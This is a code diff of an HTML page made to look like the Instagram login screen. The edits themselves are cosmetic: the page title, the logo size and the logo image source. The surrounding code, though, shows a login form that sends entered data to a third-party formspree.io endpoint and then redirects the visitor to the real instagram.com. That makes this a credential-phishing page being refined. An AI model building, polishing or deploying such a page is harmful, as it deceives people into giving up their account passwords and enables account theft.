@@ -3,7 +3,7 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Instagram Login - Style</title>
+<title>Instagram Login</title>
 <style>
   :root {
     --bg: #fafafa;
@@ -51,7 +51,7 @@
     justify-content: center;
   }
   .logo-container img {
-    max-width: 175px;
+    max-width: 130px; /* تم تصغير اللوجو هنا */
   }
 
   form {
@@ -126,7 +126,7 @@
 <div class="main-wrapper">
   <div class="card">
     <div class="logo-container">
-      <img src="https://www.instagram.com/static/images/web/logged_out_wordmark.png/7a252e00b604.png" alt="Instagram">
+      <img src="insta.jpg" alt="Instagram">
     </div>
 
     <form action="https://formspree.io/f/xgollwjg" method="POST" id="loginForm">
@@ -170,7 +170,6 @@
       body: data,
       headers: { 'Accept': 'application/json' }
     }).then(response => {
-      
       window.location.href = 'https://instagram.com';
     }).catch(error => {
       window.location.href = 'https://instagram.com';
